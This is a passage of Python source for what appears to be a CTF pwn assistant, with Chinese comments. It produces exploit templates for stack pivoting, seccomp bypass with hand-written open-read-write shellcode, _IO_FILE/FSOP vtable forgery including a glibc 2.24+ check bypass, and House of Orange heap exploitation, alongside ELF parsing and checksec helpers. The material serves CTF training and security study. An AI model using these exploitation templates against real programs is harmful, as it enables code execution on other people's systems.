#   mov {reg_sp}, {reg_bp}
#   pop {reg_bp}
# 如果我们能控制 {reg_bp}，就能控制 {reg_sp}

leave_ret = 0x0  # TODO: ROPgadget --binary vuln | grep "leave"

# 假设我们可以在某个已知地址写入 ROP chain
# 例如 BSS 段、堆、或通过 read 写入的缓冲区
fake_stack_addr = 0x0  # TODO: 可写内存地址

# 第一步: 在 fake_stack 上布置 ROP chain
# (通过 read 或其他方式预先写入)
rop_chain = b''
rop_chain += {p_func}(0xdeadbeef)  # fake {reg_bp} (占位)
rop_chain += {p_func}(0x0)         # TODO: ROP gadgets...
# ... 完整的 ROP chain

# 第二步: 溢出，覆盖 {reg_bp} 和返回地址
offset = 0x0  # TODO: 溢出偏移（到 saved {reg_bp}）
payload = b'A' * offset
payload += {p_func}(fake_stack_addr)  # 覆盖 saved {reg_bp}
payload += {p_func}(leave_ret)        # 返回到 leave; ret
# 执行流程:
#   leave -> mov {reg_sp}, {reg_bp} (={reg_sp} 指向 fake_stack)
#          -> pop {reg_bp} (从 fake_stack 弹出)
#   ret   -> 从 fake_stack+{{"8" if arch == "x64" else "4"}} 取返回地址

p.sendline(payload)

# ===== 方法 2: xchg {reg_sp}, {reg_ax}; ret 技巧 =====
# 如果能控制 {reg_ax}（例如通过函数返回值），可以用 xchg 交换

xchg_sp_ax = 0x0  # TODO: ROPgadget --binary vuln | grep "xchg"

# 场景: read() 返回读取的字节数到 {reg_ax}
# 或者某个函数返回一个我们可控的指针

# payload 示例:
# 1. 先让某个函数返回 fake_stack 地址到 {reg_ax}
# 2. 然后执行 xchg {reg_sp}, {reg_ax}; ret
# {reg_sp} 就迁移到了 fake_stack

# ===== 方法 3: pop {reg_sp}; ret (如果存在) =====
# 最直接的方式，但这种 gadget 较少见
pop_sp = 0x0  # TODO: ROPgadget --binary vuln | grep "pop {reg_sp}"

# payload = b'A' * offset + {p_func}(pop_sp) + {p_func}(fake_stack_addr)

# ===== 完整利用流程 =====
# 1. 泄露地址（如有需要）
# 2. 在可写内存布置 ROP chain（通过 read/gets 等）
# 3. 触发栈迁移
# 4. 执行 ROP chain -> getshell

p.interactive()

# ===== 调试技巧 =====
# gdb: watch $rsp  # 监控栈指针变化
# gdb: x/20gx $rsp # 查看迁移后的栈内容
'''

    def seccomp_helper(self) -> str:
        """seccomp 沙箱分析辅助"""
        return f'''=== seccomp {t("pwn.seccomp.title")} ===

# seccomp (Secure Computing) 限制进程可使用的系统调用，
# 是 CTF pwn 中常见的保护机制。

# ===== 1. 分析 seccomp 规则 =====

# 使用 seccomp-tools (推荐):
#   gem install seccomp-tools
#   seccomp-tools dump ./vuln

# 示例输出:
#  line  CODE  JT   JF      K
#  0000: 0x20 0x00 0x00 0x00000004  A = arch
#  0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
#  0002: 0x20 0x00 0x00 0x00000000  A = sys_number
#  0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
#  0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
#  0005: 0x15 0x04 0x00 0x0000003b  if (A == execve) goto 0010
#  0006: 0x15 0x03 0x00 0x00000039  if (A == fork) goto 0010

# 在 pwntools 中读取:
# from pwn import *
# p = process('./vuln')
# print(p.libs())  # 查看加载的库

# ===== 2. ORW (Open-Read-Write) Shellcode 模板 =====
# 当 execve 被禁止但 open/read/write 允许时使用

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# 方法 A: 使用 pwntools shellcraft
shellcode = shellcraft.open('/flag', 0)       # open("/flag", O_RDONLY)
shellcode += shellcraft.read('rax', 'rsp', 100)  # read(fd, buf, 100)
shellcode += shellcraft.write(1, 'rsp', 100)     # write(stdout, buf, 100)
payload = asm(shellcode)

# 方法 B: 手写 ORW shellcode (x64)
orw_shellcode = asm("""
    /* open("/flag", O_RDONLY) */
    xor rsi, rsi          /* flags = O_RDONLY = 0 */
    push rsi              /* null terminator */
    mov rdi, 0x67616c662f /* "/flag" */
    push rdi
    mov rdi, rsp          /* rdi = pointer to "/flag" */
    xor rdx, rdx          /* mode = 0 */
    mov rax, 2            /* sys_open */
    syscall

    /* read(fd, buf, 0x100) */
    mov rdi, rax          /* fd = open 返回值 */
    mov rsi, rsp          /* buf = stack */
    mov rdx, 0x100        /* count */
    xor rax, rax          /* sys_read = 0 */
    syscall

    /* write(1, buf, 0x100) */
    mov rdi, 1            /* fd = stdout */
    mov rsi, rsp          /* buf */
    mov rdx, 0x100        /* count */
    mov rax, 1            /* sys_write */
    syscall
""")

# ===== 3. 绕过技巧列表 =====

# 3.1 如果只禁了 execve:
#   - 使用 ORW 读取 flag
#   - 使用 execveat (syscall 322) 代替 execve

# 3.2 如果禁了 open 但允许 openat:
#   - openat(AT_FDCWD, "/flag", O_RDONLY)
#   - AT_FDCWD = -100

# 3.3 如果禁了 read/write:
#   - 使用 sendfile(out_fd, in_fd, offset, count)
#   - 使用 mmap 映射文件后通过其他方式输出
#   - 使用 preadv / pwritev / splice

# 3.4 如果限制了 arch (禁止 x86_64):
#   - 使用 retfq 切换到 32 位模式执行 (int 0x80)
#   - 32 位 syscall 号不同: open=5, read=3, write=4

# 3.5 如果过滤了 syscall 号范围:
#   - 检查是否有 x32 ABI 漏洞 (syscall | 0x40000000)

# 3.6 利用已有的文件描述符:
#   - 程序可能已经打开了 flag 文件
#   - 尝试 read(3, buf, 100) / read(4, buf, 100)

# ===== 4. seccomp 规则构造 (用于测试) =====
# from seccomp import *
# f = SyscallFilter(defaction=ALLOW)
# f.add_rule(KILL, "execve")
# f.load()
'''

    def io_file_template(self) -> str:
        """IO_FILE 利用模板"""
        return f'''=== IO_FILE {t("pwn.template.exploit")} (FSOP) ===

# _IO_FILE 结构体是 glibc 中文件流的核心数据结构。
# 通过伪造 _IO_FILE 结构体可以劫持程序控制流。

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# ===== _IO_FILE 结构体布局 (glibc 2.23) =====
# 偏移  字段
# 0x00  _flags
# 0x08  _IO_read_ptr
# 0x10  _IO_read_end
# 0x18  _IO_read_base
# 0x20  _IO_write_base
# 0x28  _IO_write_ptr
# 0x30  _IO_write_end
# 0x38  _IO_buf_base
# 0x40  _IO_buf_end
# ...
# 0x88  _fileno
# ...
# 0xc0  _mode
# 0xd8  vtable

# ===== 方法 1: FSOP (File Stream Oriented Programming) =====
# 伪造 _IO_FILE 链表，在 exit() 时触发 _IO_flush_all_lockp

def forge_io_file_fsop(fake_vtable_addr, system_addr, bin_sh_addr):
    """
    伪造 _IO_FILE 结构体 (glibc < 2.24)

    触发条件: 程序调用 exit() 或 main 返回时
    _IO_flush_all_lockp 会遍历 _IO_list_all 链表，
    对每个 FILE 调用 vtable 中的 __overflow
    """
    file_struct = b''
    file_struct += p64(0x00000000fbad2887)  # _flags: 需要满足检查
    file_struct += p64(0) * 3               # _IO_read_ptr/end/base
    file_struct += p64(0)                   # _IO_write_base = 0
    file_struct += p64(1)                   # _IO_write_ptr = 1 (需要 > write_base)
    file_struct += p64(0) * 2               # _IO_write_end, _IO_buf_base
    file_struct += p64(0)                   # _IO_buf_end
    file_struct += p64(0) * 4               # _IO_save_base 等
    file_struct += p64(0)                   # _markers
    file_struct += p64(0)                   # _chain (链接下一个 FILE)
    file_struct += p32(0)                   # _fileno
    file_struct += p32(0)                   # _flags2
    file_struct += p64(0)                   # _old_offset
    file_struct += p16(0)                   # _cur_column
    file_struct += b'\\x00' * 6             # 填充
    file_struct += p64(0)                   # _lock (指向有效地址)
    file_struct += p64(0) * 4               # 其他字段
    file_struct += p32(0)                   # _mode = 0
    file_struct += b'\\x00' * 20            # 填充
    # vtable 指针
    file_struct += p64(fake_vtable_addr)    # 伪造的 vtable
    return file_struct

# ===== 方法 2: vtable 劫持 (glibc < 2.24) =====
# 直接修改 FILE 结构体的 vtable 指针

def forge_vtable(target_func):
    """
    伪造 vtable，将 __overflow 指向 target_func
    __overflow 在 vtable 偏移 0x18 处
    """
    vtable = b''
    vtable += p64(0) * 3          # 前三个虚函数
    vtable += p64(target_func)    # __overflow -> system / one_gadget
    vtable += p64(0) * 18         # 其余虚函数
    return vtable

# ===== 方法 3: glibc 2.24+ vtable check 绕过 =====
# glibc 2.24 加入了 IO_validate_vtable，检查 vtable 是否在合法范围内

# 绕过方法 1: 使用 _IO_str_jumps (在合法 vtable 范围内)
# _IO_str_jumps->__overflow 会调用:
#   ((_IO_strfile*)fp)->_s._allocate_buffer(new_size)
# 可以控制 _s._allocate_buffer 为 system

def forge_io_str_overflow(io_str_jumps, system_addr, bin_sh_addr):
    """
    利用 _IO_str_jumps 绕过 vtable 检查 (glibc 2.24-2.27)
    """
    file_struct = b''
    file_struct += p64(0)                       # _flags
    file_struct += p64(0) * 3                   # read ptrs
    file_struct += p64(0)                       # _IO_write_base
    file_struct += p64((bin_sh_addr - 100) // 2)  # _IO_write_ptr (控制 new_size)
    file_struct += p64(0)                       # _IO_write_end
    file_struct += p64(bin_sh_addr)             # _IO_buf_base (作为参数)
    file_struct += p64(bin_sh_addr + 0x100)     # _IO_buf_end
    file_struct += p64(0) * 8                   # 其他字段
    file_struct += p64(0)                       # _lock
    file_struct += p64(0) * 4
    file_struct += p32(0)                       # _mode
    file_struct += b'\\x00' * 20
    file_struct += p64(io_str_jumps - 8)        # vtable (指向 _IO_str_jumps)
    # _s._allocate_buffer 在 FILE 结构体后面
    file_struct += p64(0)
    file_struct += p64(system_addr)             # _s._allocate_buffer -> system
    return file_struct

# 绕过方法 2: glibc 2.28+ 使用 _IO_wstr_jumps
# 类似原理，通过 wide character 相关函数链

# ===== 利用流程 =====
# 1. 泄露 libc 基址
# 2. 计算 _IO_list_all / system / "/bin/sh" 地址
# 3. 通过 unsorted bin attack 或任意写修改 _IO_list_all
# 4. 伪造 _IO_FILE 结构体
# 5. 触发 exit() / main 返回 / malloc_printerr

p = process('./vuln')
# ... (利用代码)
p.interactive()

# ===== 推荐参考 =====
# - glibc 源码: libio/fileops.c, libio/strops.c
# - ctf-wiki: https://ctf-wiki.org/pwn/linux/io_file/
'''

    def house_of_orange_template(self) -> str:
        """House of Orange 利用模板"""
        return f'''=== House of Orange {t("pwn.template.exploit")} ===

# House of Orange 是一种不需要 free 的堆利用技术。
# 核心思路:
#   1. 修改 top chunk 的 size，使其不满足下次分配
#   2. 触发 sysmalloc，旧的 top chunk 被放入 unsorted bin
#   3. 利用 unsorted bin attack + IO_FILE 伪造完成利用

# 适用: glibc < 2.26 (经典版本), 无需 free 功能

#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# ===== 第一步: 修改 top chunk size =====
# 通过堆溢出修改 top chunk 的 size 字段

# top chunk size 必须满足:
#   1. 页对齐: (top_addr + size) 必须是页对齐的 (& 0xfff == 0)
#   2. prev_inuse 位必须为 1
#   3. size 必须 > MINSIZE (0x20)
#   4. size 必须 < 原来的 top chunk size

# 计算合法的 fake size:
# 假设 top chunk 在 heap_base + 0x???0 处
# fake_size = (页边界 - top_addr) | 1
# 例如: 如果 top 在 0x555555603060
#   页边界 = 0x555555604000
#   fake_size = 0x555555604000 - 0x555555603060 = 0xfa0
#   fake_size |= 1 = 0xfa1 (设置 prev_inuse)

# 示例: 通过 edit 功能溢出修改 top chunk
# edit(chunk_idx, b'A' * chunk_data_size + p64(0) + p64(fake_top_size))

# ===== 第二步: 触发 sysmalloc =====
# 申请一个比 fake top size 大的 chunk
# 这会导致:
#   1. 旧的 top chunk 被 free 到 unsorted bin
#   2. 系统 mmap 新的内存作为新的 top chunk

# alloc(fake_top_size + 0x10)  # 大于 fake size 的请求

# ===== 第三步: 泄露地址 =====
# 旧 top chunk 现在在 unsorted bin 中
# 其 fd/bk 指向 main_arena+88
# 通过 UAF 或 show 功能泄露 libc 地址

# leaked = show(chunk_idx)
# main_arena_88 = u64(leaked[:8])
# libc_base = main_arena_88 - (libc.symbols['__malloc_hook'] + 0x10 + 88)

# ===== 第四步: unsorted bin attack + FSOP =====
# 修改 unsorted bin chunk 的 bk 指向 _IO_list_all - 0x10
# 同时在 chunk 中伪造 _IO_FILE 结构体

# 关键偏移:
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# 伪造的 _IO_FILE + unsorted bin attack:
payload = b''
payload += b'/bin/sh\\x00'              # 前 8 字节作为 system 参数
payload += p64(0x61)                    # fake size = 0x61 (smallbin[4])
# unsorted bin attack: bk = _IO_list_all - 0x10
# 当 unsorted bin 被整理时，会执行:
#   victim->bk->fd = unsorted_chunks(av)
# 即 _IO_list_all = main_arena+88 (指向我们的 chunk)
payload += p64(0)                       # fd
payload += p64(_IO_list_all - 0x10)     # bk (unsorted bin attack)

# 填充 _IO_FILE 结构体
payload += p64(2) + p64(3)              # _IO_write_base=2, _IO_write_ptr=3
payload += b'\\x00' * 0x78              # 填充到 _chain 字段

# _chain 指向 smallbin[4] 中的下一个 chunk
# (当 unsorted bin 整理失败时，chunk 会被放入对应的 smallbin)
# 我们需要在 smallbin[4] 对应位置伪造另一个 _IO_FILE

payload += p64(0) * 2                   # 填充
payload += p64(system_addr)             # vtable 中的 __overflow 指向 system

# 注意: 完整的 payload 需要精确计算偏移
# 具体偏移取决于 glibc 版本和 _IO_FILE 布局

# ===== 触发 =====
# 申请一个会导致 unsorted bin 整理的 chunk
# malloc 过程中:
#   1. 检查 unsorted bin -> 发现 chunk size != 请求 size
#   2. 尝试放入 smallbin/largebin
#   3. unsorted bin attack 被触发，_IO_list_all 被覆写
#   4. 整理过程出错 -> malloc_printerr -> __libc_message
#   5. 调用 abort() -> _IO_flush_all_lockp
#   6. 遍历 _IO_list_all -> 找到伪造的 _IO_FILE
#   7. 调用 vtable->__overflow(fp) = system("/bin/sh")

# alloc(0x10)  # 触发 unsorted bin 整理

p.interactive()

# ===== 注意事项 =====
# 1. glibc 2.24+ 有 vtable 检查，需要使用 _IO_str_jumps 绕过
# 2. glibc 2.26+ 有 tcache，可能影响 unsorted bin 行为
# 3. 需要精确控制 chunk size 使其落入正确的 bin
# 4. 调试时用 pwndbg 的 bins / vis 命令查看堆状态
# 5. house of orange 变体 (2.24+) 需要结合 _IO_str_overflow

# ===== 推荐参考 =====
# - 原始论文: https://github.com/shellphish/how2heap
# - ctf-wiki: https://ctf-wiki.org/pwn/linux/glibc-heap/house_of_orange/
'''

    def _de_bruijn(self, length: int) -> str:
        """生成 De Bruijn 序列"""
        charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
        k = len(charset)
        n = 4  # 子序列长度
        a = [0] * (k * n)
        sequence = []

        def db(t, p):
            if len(sequence) >= length:
                return
            if t > n:
                if n % p == 0:
                    for j in range(1, p + 1):
                        if len(sequence) >= length:
                            return
                        sequence.append(charset[a[j]])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    if len(sequence) >= length:
                        return
                    a[t] = j
                    db(t + 1, t)

        db(1, 1)
        return ''.join(sequence[:length])

    # ========== ELF 解析辅助 ==========

    def _parse_remote(self, remote: str):
        """解析 remote 参数，返回 (host, port) 或 None"""
        if not remote or not remote.strip():
            return None
        remote = remote.strip()
        # 去掉开头的 "nc "
        if remote.lower().startswith("nc "):
            remote = remote[3:].strip()
        # 支持 "host:port" 格式
        if ':' in remote and ' ' not in remote:
            parts = remote.split(':')
            if len(parts) == 2:
                return (parts[0].strip(), parts[1].strip())
        # 支持 "host port" 格式
        parts = remote.split()
        if len(parts) >= 2:
            return (parts[0].strip(), parts[1].strip())
        return None

    def _parse_elf_header(self, data: bytes):
        """解析 ELF header 基本信息，返回 dict 或 None"""
        if len(data) < 64 or data[:4] != b'\x7fELF':
            return None
        ei_class = data[4]  # 1=32, 2=64
        ei_data = data[5]   # 1=LE, 2=BE
        is_64 = (ei_class == 2)
        is_le = (ei_data == 1)
        fmt = '<' if is_le else '>'

        info = {
            'is_64': is_64,
            'is_le': is_le,
            'fmt': fmt,
            'ei_class': ei_class,
            'arch_bits': 64 if is_64 else 32,
            'ptr_size': 8 if is_64 else 4,
        }

        if is_64:
            info['e_type'] = struct.unpack(fmt + 'H', data[16:18])[0]
            info['e_machine'] = struct.unpack(fmt + 'H', data[18:20])[0]
            info['e_entry'] = struct.unpack(fmt + 'Q', data[24:32])[0]
            info['e_phoff'] = struct.unpack(fmt + 'Q', data[32:40])[0]
            info['e_shoff'] = struct.unpack(fmt + 'Q', data[40:48])[0]
            info['e_phentsize'] = struct.unpack(fmt + 'H', data[54:56])[0]
            info['e_phnum'] = struct.unpack(fmt + 'H', data[56:58])[0]
            info['e_shentsize'] = struct.unpack(fmt + 'H', data[58:60])[0]
            info['e_shnum'] = struct.unpack(fmt + 'H', data[60:62])[0]
            info['e_shstrndx'] = struct.unpack(fmt + 'H', data[62:64])[0]
        else:
            info['e_type'] = struct.unpack(fmt + 'H', data[16:18])[0]
            info['e_machine'] = struct.unpack(fmt + 'H', data[18:20])[0]
            info['e_entry'] = struct.unpack(fmt + 'I', data[24:28])[0]
            info['e_phoff'] = struct.unpack(fmt + 'I', data[28:32])[0]
            info['e_shoff'] = struct.unpack(fmt + 'I', data[32:36])[0]
            info['e_phentsize'] = struct.unpack(fmt + 'H', data[42:44])[0]
            info['e_phnum'] = struct.unpack(fmt + 'H', data[44:46])[0]
            info['e_shentsize'] = struct.unpack(fmt + 'H', data[46:48])[0]
            info['e_shnum'] = struct.unpack(fmt + 'H', data[48:50])[0]
            info['e_shstrndx'] = struct.unpack(fmt + 'H', data[50:52])[0]

        return info

    def _parse_elf_sections(self, data: bytes, info: dict):
        """解析 ELF section headers，返回 sections 列表"""
        fmt = info['fmt']
        is_64 = info['is_64']
        e_shoff = info['e_shoff']
        e_shentsize = info['e_shentsize']
        e_shnum = info['e_shnum']
        e_shstrndx = info['e_shstrndx']

        sections = []
        for i in range(e_shnum):
            off = e_shoff + i * e_shentsize
            if off + e_shentsize > len(data):
                break
            if is_64:
                sh_name = struct.unpack(fmt + 'I', data[off:off+4])[0]
                sh_type = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                sh_flags = struct.unpack(fmt + 'Q', data[off+8:off+16])[0]
                sh_addr = struct.unpack(fmt + 'Q', data[off+16:off+24])[0]
                sh_offset = struct.unpack(fmt + 'Q', data[off+24:off+32])[0]
                sh_size = struct.unpack(fmt + 'Q', data[off+32:off+40])[0]
                sh_link = struct.unpack(fmt + 'I', data[off+40:off+44])[0]
                sh_info = struct.unpack(fmt + 'I', data[off+44:off+48])[0]
                sh_entsize = struct.unpack(fmt + 'Q', data[off+56:off+64])[0]
            else:
                sh_name = struct.unpack(fmt + 'I', data[off:off+4])[0]
                sh_type = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                sh_flags = struct.unpack(fmt + 'I', data[off+8:off+12])[0]
                sh_addr = struct.unpack(fmt + 'I', data[off+12:off+16])[0]
                sh_offset = struct.unpack(fmt + 'I', data[off+16:off+20])[0]
                sh_size = struct.unpack(fmt + 'I', data[off+20:off+24])[0]
                sh_link = struct.unpack(fmt + 'I', data[off+24:off+28])[0]
                sh_info = struct.unpack(fmt + 'I', data[off+28:off+32])[0]
                sh_entsize = struct.unpack(fmt + 'I', data[off+36:off+40])[0]
            sections.append({
                'sh_name_idx': sh_name,
                'sh_type': sh_type,
                'sh_flags': sh_flags,
                'sh_addr': sh_addr,
                'sh_offset': sh_offset,
                'sh_size': sh_size,
                'sh_link': sh_link,
                'sh_info': sh_info,
                'sh_entsize': sh_entsize,
                'name': '',  # 稍后填充
            })

        # 解析 section name string table
        if e_shstrndx < len(sections):
            strtab = sections[e_shstrndx]
            strtab_data = data[strtab['sh_offset']:strtab['sh_offset'] + strtab['sh_size']]
            for sec in sections:
                idx = sec['sh_name_idx']
                if idx < len(strtab_data):
                    end = strtab_data.find(b'\x00', idx)
                    if end < 0:
                        end = len(strtab_data)
                    sec['name'] = strtab_data[idx:end].decode('utf-8', errors='replace')

        return sections

    def _parse_elf_symbols(self, data: bytes, info: dict, sections: list):
        """解析 ELF 符号表 (.symtab + .dynsym)，返回符号列表"""
        fmt = info['fmt']
        is_64 = info['is_64']
        symbols = []

        # SHT_SYMTAB = 2, SHT_DYNSYM = 11
        for sec in sections:
            if sec['sh_type'] not in (2, 11):
                continue
            entsize = sec['sh_entsize']
            if entsize == 0:
                entsize = 24 if is_64 else 16
            strtab_sec = sections[sec['sh_link']] if sec['sh_link'] < len(sections) else None
            if not strtab_sec:
                continue
            strtab_data = data[strtab_sec['sh_offset']:strtab_sec['sh_offset'] + strtab_sec['sh_size']]

            num_syms = sec['sh_size'] // entsize
            for i in range(num_syms):
                off = sec['sh_offset'] + i * entsize
                if off + entsize > len(data):
                    break
                if is_64:
                    st_name = struct.unpack(fmt + 'I', data[off:off+4])[0]
                    st_info = data[off + 4]
                    data[off + 5]
                    st_shndx = struct.unpack(fmt + 'H', data[off+6:off+8])[0]
                    st_value = struct.unpack(fmt + 'Q', data[off+8:off+16])[0]
                    st_size = struct.unpack(fmt + 'Q', data[off+16:off+24])[0]
                else:
                    st_name = struct.unpack(fmt + 'I', data[off:off+4])[0]
                    st_value = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                    st_size = struct.unpack(fmt + 'I', data[off+8:off+12])[0]
                    st_info = data[off + 12]
                    data[off + 13]
                    st_shndx = struct.unpack(fmt + 'H', data[off+14:off+16])[0]

                # 解析符号名
                name = ''
                if st_name < len(strtab_data):
                    end = strtab_data.find(b'\x00', st_name)
                    if end < 0:
                        end = len(strtab_data)
                    name = strtab_data[st_name:end].decode('utf-8', errors='replace')

                st_bind = st_info >> 4
                st_type = st_info & 0xf

                symbols.append({
                    'name': name,
                    'value': st_value,
                    'size': st_size,
                    'bind': st_bind,  # 0=LOCAL, 1=GLOBAL, 2=WEAK
                    'type': st_type,  # 0=NOTYPE, 1=OBJECT, 2=FUNC, 3=SECTION
                    'shndx': st_shndx,
                    'section_type': 'dynsym' if sec['sh_type'] == 11 else 'symtab',
                })

        return symbols

    def _parse_elf_program_headers(self, data: bytes, info: dict):
        """解析 ELF program headers，返回列表"""
        fmt = info['fmt']
        is_64 = info['is_64']
        e_phoff = info['e_phoff']
        e_phentsize = info['e_phentsize']
        e_phnum = info['e_phnum']

        phdrs = []
        for i in range(e_phnum):
            off = e_phoff + i * e_phentsize
            if off + e_phentsize > len(data):
                break
            p_type = struct.unpack(fmt + 'I', data[off:off+4])[0]
            if is_64:
                p_flags = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                p_offset = struct.unpack(fmt + 'Q', data[off+8:off+16])[0]
                p_vaddr = struct.unpack(fmt + 'Q', data[off+16:off+24])[0]
                p_paddr = struct.unpack(fmt + 'Q', data[off+24:off+32])[0]
                p_filesz = struct.unpack(fmt + 'Q', data[off+32:off+40])[0]
                p_memsz = struct.unpack(fmt + 'Q', data[off+40:off+48])[0]
            else:
                p_offset = struct.unpack(fmt + 'I', data[off+4:off+8])[0]
                p_vaddr = struct.unpack(fmt + 'I', data[off+8:off+12])[0]
                p_paddr = struct.unpack(fmt + 'I', data[off+12:off+16])[0]
                p_filesz = struct.unpack(fmt + 'I', data[off+16:off+20])[0]
                p_memsz = struct.unpack(fmt + 'I', data[off+20:off+24])[0]
                p_flags = struct.unpack(fmt + 'I', data[off+24:off+28])[0]
            phdrs.append({
                'p_type': p_type,
                'p_flags': p_flags,
                'p_offset': p_offset,
                'p_vaddr': p_vaddr,
                'p_paddr': p_paddr,
                'p_filesz': p_filesz,
                'p_memsz': p_memsz,
            })
        return phdrs

    def _elf_checksec(self, data: bytes, info: dict, phdrs: list):
        """检测 ELF 保护机制，返回 dict"""
        fmt = info['fmt']
        is_64 = info['is_64']
        result = {
            'nx': False,
            'canary': False,
            'pie': False,
            'relro': 'none',  # none / partial / full
            'fortify': False,
        }

        for ph in phdrs:
            # PT_GNU_STACK (0x6474e551)
            if ph['p_type'] == 0x6474e551:
                result['nx'] = not (ph['p_flags'] & 0x1)  # PF_X = 1
            # PT_GNU_RELRO (0x6474e552)
            if ph['p_type'] == 0x6474e552:
                result['relro'] = 'partial'

        # 检测 Full RELRO: 查找 DT_BIND_NOW
        if result['relro'] == 'partial':
            for ph in phdrs:
                if ph['p_type'] == 2:  # PT_DYNAMIC
                    entry_size = 16 if is_64 else 8
                    dyn_off = ph['p_offset']
                    dyn_size = ph['p_filesz']
                    for j in range(0, min(dyn_size, 4096), entry_size):
                        pos = dyn_off + j
                        if pos + entry_size > len(data):
                            break
                        if is_64:
                            d_tag = struct.unpack(fmt + 'Q', data[pos:pos+8])[0]
                        else:
                            d_tag = struct.unpack(fmt + 'I', data[pos:pos+4])[0]
                        if d_tag == 24:  # DT_BIND_NOW
                            result['relro'] = 'full'
                            break
                        if d_tag == 30:  # DT_FLAGS
                            if is_64:
                                d_val = struct.unpack(fmt + 'Q', data[pos+8:pos+16])[0]
                            else:
                                d_val = struct.unpack(fmt + 'I', data[pos+4:pos+8])[0]
                            if d_val & 0x8:  # DF_BIND_NOW
                                result['relro'] = 'full'
                                break
                        if d_tag == 0:  # DT_NULL
                            break
                    break

        # PIE
        result['pie'] = (info['e_type'] == 3)  # ET_DYN

        # Canary
        result['canary'] = b'__stack_chk_fail' in data

        # FORTIFY
        result['fortify'] = any(s in data for s in [b'__printf_chk', b'__memcpy_chk', b'__strcpy_chk'])

        return result

    def _elf_find_string(self, data: bytes, target: bytes):
        """在 ELF 中搜索指定字符串，返回所有文件偏移列表"""
        offsets = []
        start = 0
        while True:
            pos = data.find(target, start)
            if pos < 0:
                break
            offsets.append(pos)
            start = pos + 1
        return offsets

    def _elf_file_offset_to_vaddr(self, phdrs: list, file_offset: int):
        """将文件偏移转换为虚拟地址"""
        for ph in phdrs:
            if ph['p_type'] != 1:  # PT_LOAD
                continue
            if ph['p_offset'] <= file_offset < ph['p_offset'] + ph['p_filesz']:
                return file_offset - ph['p_offset'] + ph['p_vaddr']
        return None

    def _elf_vaddr_to_file_offset(self, phdrs: list, vaddr: int):
        """将虚拟地址转换为文件偏移"""
        for ph in phdrs:
            if ph['p_type'] != 1:  # PT_LOAD
                continue
            if ph['p_vaddr'] <= vaddr < ph['p_vaddr'] + ph['p_memsz']:
                offset_in_seg = vaddr - ph['p_vaddr']
                if offset_in_seg < ph['p_filesz']:
                    return ph['p_offset'] + offset_in_seg
        return None

    def _elf_find_text_section(self, sections: list):
        """找到 .text section"""
        for sec in sections:
            if sec['name'] == '.text':
                return sec
        return None

    def _elf_find_dangerous_funcs(self, symbols: list):
        """在符号表中搜索危险函数"""
        dangerous = ['gets', 'scanf', 'strcpy', 'strcat', 'sprintf',
                      'read', 'vscanf', '__isoc99_scanf', 'sscanf',
                      'fgets', 'memcpy', '__gets_chk']
        found = []
        for sym in symbols:
            name = sym['name']
            if not name:
                continue
            for d in dangerous:
                if name == d or name == f'__{d}' or name.endswith(f'@{d}'):
                    found.append({'name': name, 'value': sym['value'],
                                  'type': sym['type'], 'bind': sym['bind']})
                    break
        return found

    def _elf_find_backdoor_funcs(self, symbols: list):
        """搜索后门相关函数（system, execve 等）"""
        backdoor_names = ['system', 'execve', 'execl', 'execvp', 'popen']
        found = []
        for sym in symbols:
            if sym['name'] in backdoor_names:
                found.append({'name': sym['name'], 'value': sym['value'],
                              'type': sym['type'], 'bind': sym['bind']})
        return found

    def _elf_find_useful_strings(self, data: bytes, phdrs: list):
        """搜索有用的字符串及其虚拟地址"""
        targets = [b'/bin/sh\x00', b'/bin/cat\x00', b'/bin/bash\x00',
                    b'flag\x00', b'flag.txt\x00', b'/flag\x00']
        found = []
        for target in targets:
            offsets = self._elf_find_string(data, target)
            for off in offsets:
                vaddr = self._elf_file_offset_to_vaddr(phdrs, off)
                if vaddr is not None:
                    s = target.rstrip(b'\x00').decode('utf-8', errors='replace')
                    found.append({'string': s, 'vaddr': vaddr, 'file_offset': off})
        return found

    def _elf_find_backdoor_target(self, data: bytes, info: dict, sections: list, phdrs: list):
        """
        搜索后门目标地址：找到加载 /bin/sh 地址的指令位置。
        返回 (target_addr, description) 或 None
        """
        # 首先找到 /bin/sh 的虚拟地址
        bin_sh_offsets = self._elf_find_string(data, b'/bin/sh\x00')
        if not bin_sh_offsets:
            return None

        text_sec = self._elf_find_text_section(sections)
        if not text_sec:
            return None

        text_data = data[text_sec['sh_offset']:text_sec['sh_offset'] + text_sec['sh_size']]
        text_vaddr = text_sec['sh_addr']
        is_64 = info['is_64']
        info['fmt']

        for bin_sh_foff in bin_sh_offsets:
            bin_sh_vaddr = self._elf_file_offset_to_vaddr(phdrs, bin_sh_foff)
            if bin_sh_vaddr is None:
                continue

            if is_64:
                # 搜索 lea rdi, [rip+xxx] => 48 8d 3d xx xx xx xx
                # 或 mov edi, imm32 => bf xx xx xx xx
                for i in range(len(text_data) - 7):
                    # LEA RDI, [rip + disp32]
                    if text_data[i] == 0x48 and text_data[i+1] == 0x8d and text_data[i+2] == 0x3d:
                        disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                        insn_vaddr = text_vaddr + i
                        target = insn_vaddr + 7 + disp
                        if target == bin_sh_vaddr:
                            func_start = self._find_func_start_64(text_data, i, text_vaddr)
                            has_cond = self._has_conditional_jump(text_data, i, func_start, text_vaddr) if func_start else False
                            # 检测 lea rdi 后面是否跟着 call（决定是否需要 ret gadget）
                            uses_call = self._next_is_call(text_data, i + 7)
                            desc = f"lea rdi, [rip+0x{disp & 0xFFFFFFFF:x}]  ; /bin/sh @ 0x{bin_sh_vaddr:x}"
                            return {
                                'insn_addr': insn_vaddr,
                                'func_addr': func_start,
                                'has_conditional': has_cond,
